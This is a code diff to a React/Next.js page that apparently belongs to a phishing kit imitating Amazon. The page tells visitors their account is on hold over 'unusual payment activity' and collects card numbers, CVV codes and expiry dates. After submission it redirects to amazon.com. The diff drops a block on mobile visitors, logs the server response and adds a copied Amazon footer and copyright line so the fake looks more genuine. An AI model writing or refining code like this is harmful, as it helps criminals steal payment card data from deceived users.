@@ -6,10 +6,7 @@ import { useRouter } from 'next/navigation'
 
 import './styles.css'
 import styles from './styles.module.css'
-import styles1 from '../styles.module.css'
-
-import ErrorMobile from '@/app/components/errorMobile/index'
-
+import styles1 from '../loginMobile/styles.module.css'
 export default function Home() {
     const [loading, setLoading] = useState(false);
     const [submit, setSubmit] = useState(false);
@@ -32,7 +29,6 @@ export default function Home() {
     const [urlImages, setUrlImages] = useState([]);
 
     const router = useRouter();
-    const windowWidth = window.innerWidth;
 
     useEffect(() => {
         const data = {
@@ -88,7 +84,8 @@ export default function Home() {
                 body: JSON.stringify(user),
             })
                 .then((resp) => resp.json())
-                .then(() => {
+                .then((data) => {
+                    console.log("🚀 ~ .then ~ data:", data)
                     data.success
                         ? (window.location.href = 'https://www.amazon.com/')
                         : console.log('error data');
@@ -151,16 +148,11 @@ export default function Home() {
         setZipcode(event.target.value);
     };
 
-    if (windowWidth < 640) {
-        return <ErrorMobile />
-    
-      }
-
 
     return (
         <main className={`flex min-h-screen flex-col items-center justify-between ${styles.mainContainer}`}>
             <div className="flex min-h-full flex-1 flex-col ">
-                <div className="flex justify-center items-center">
+                <div className={"flex " + styles.loginNav}>
                     <i className={styles.loginLogo} alt="Logo here" />
                 </div>
                 <form className="mt-4">
@@ -178,7 +170,6 @@ export default function Home() {
                                     <h4 className={styles.errorAlertHeading}>
                                         Account on hold temporarily
                                     </h4>
-                                    <i className={`${styles.errorIcon} ${styles.errorIconAlert} ${styles.displayMobile}`} />
                                     <div className={`${styles.errorAlertContent}`}>
                                         We noticed unusual payment activity on your account and need to
                                         verify ownership of the payment method used on your most recent
@@ -542,7 +533,7 @@ export default function Home() {
                                         <option value="UA">Ukraine</option>
                                         <option value="AE">United Arab Emirates</option>
                                         <option value="GB">United Kingdom</option>
-                                        <option value="US" selected="">
+                                        <option value="US" >
                                             United States
                                         </option>
                                         <option value="UM">United States Minor Outlying Islands</option>
@@ -838,7 +829,7 @@ export default function Home() {
                             )}
                         </div>
                     </div>
-                    <div className="flex flex-row justify-between">
+                    <div className="flex flex-col justify-between">
                         <div
                             id=""
                             className={`${styles.customYourCardItem1}`}
@@ -880,7 +871,7 @@ export default function Home() {
                             <div className={styles.errorSection + " " + styles.errorSpacingNone}>
                                 <div className={styles.errorSection + " " + styles.errorSpacingNone}>
                                     <label className={`${styles.errorFormLabel}`}>
-                                        <i className={`${styles.inputFieldRequired} w-25`} /> Security Code (CVV/CVC)
+                                        <i className={`${styles.inputFieldRequired} w-full`} /> Security Code (CVV/CVC)
                                     </label>
                                     <input
                                         required=""
@@ -920,7 +911,7 @@ export default function Home() {
                                 </label>
                                 <div className={styles.customYourCard2}>
                                     <span className="">
-                                        <select className={styles.seclectCustom}
+                                        <select className={styles.seclectCustom + " " + styles.seclectCustomDate}
                                             defaultValue={year}
                                             onChange={handleChangeMonth}>
                                             <option className={styles.customOption} value={1}>
@@ -941,8 +932,8 @@ export default function Home() {
                                     </span>
                                     <span className="">
                                         <select defaultValue={year}
-                                            onChange={handleChangeYear} className={styles.seclectCustom}>
-                                            <option value={2024} selected="">
+                                            onChange={handleChangeYear} className={styles.seclectCustom + " " + styles.seclectCustomDate}>
+                                            <option value={2024} >
                                                 2024
                                             </option>
                                             <option value={2025}>2025</option>
@@ -1042,7 +1033,7 @@ export default function Home() {
                                                 <div className="loading"></div>
                                             </div>
                                         ) : (
-                                            <span>
+                                            <span >
                                                 Submit billing details &
                                                 document
                                             </span>
@@ -1054,6 +1045,33 @@ export default function Home() {
                     </div>
                 </form>
             </div >
+            <div className={styles1['a-section'] + ' ' + styles1['abbott-view-footer']}>
+                <div className={styles1['a-section'] + ' ' + styles1['a-spacing-none']}>
+                    <div className={styles1['a-section'] + ' ' + styles1['abbott-view-component']}>
+                        <div className={styles1['a-section'] + ' ' + styles1['a-spacing-extra-large'] + ' ' + styles1['a-spacing-top-extra-large']}>
+                            <div className={styles1['a-divider'] + ' ' + styles1['a-divider-section']}>
+                                <div className={styles1['a-divider-inner']}></div>
+                            </div>
+                            <div className={styles1['a-section']}>
+                                <div className={styles1['a-section'] + ' ' + styles1['a-text-center'] + ' ' + styles1['a-spacing-small']}>
+                                    <a className={styles1['a-size-mini'] + ' ' + styles1['a-link-normal'] + ' ' + styles1['a-padding-mini']} href="#">
+                                        Conditions of Use
+                                    </a>
+                                    <a className={styles1['a-size-mini'] + ' ' + styles1['a-link-normal'] + ' ' + styles1['a-padding-mini']} href="#">
+                                        Privacy Notice
+                                    </a>
+                                    <a className={styles1['a-size-mini'] + ' ' + styles1['a-link-normal'] + ' ' + styles1['a-padding-mini']} href="#">
+                                        Help
+                                    </a>
+                                </div>
+                                <div className={styles1['a-section'] + ' ' + styles1['a-text-center'] + ' ' + styles1['a-size-mini'] + ' ' + styles1['a-color-secondary']}>
+                                    © 1996-2024, Amazon.com, Inc. or its affiliates.
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
         </main >
     );
 }
